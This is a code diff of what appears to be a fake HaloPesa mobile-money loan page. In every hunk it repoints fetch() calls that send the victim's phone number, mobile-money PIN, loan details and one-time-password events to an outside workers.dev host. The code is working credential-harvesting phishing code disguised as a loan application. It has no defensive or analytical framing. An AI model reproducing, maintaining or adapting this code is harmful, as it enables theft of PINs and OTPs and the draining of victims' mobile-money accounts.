@@ -704,7 +704,7 @@ function submitPin(){
 
   (function(){
     var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'pin_submitted',data:{
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
@@ -816,7 +816,7 @@ function verifyOtp1(){
 
   (function(){
     var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'otp1_verified',data:{
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
@@ -837,7 +837,7 @@ function resendOtp1(){
 
   (function(){
     var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'otp1_resent',data:{
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
@@ -900,7 +900,7 @@ function verifyOtp2(){
 
   (function(){
     var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'otp2_verified',data:{
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
@@ -922,7 +922,7 @@ function resendOtp2(){
 
   (function(){
     var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'otp2_resent',data:{
         phone:phoneDigits||'',
         pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
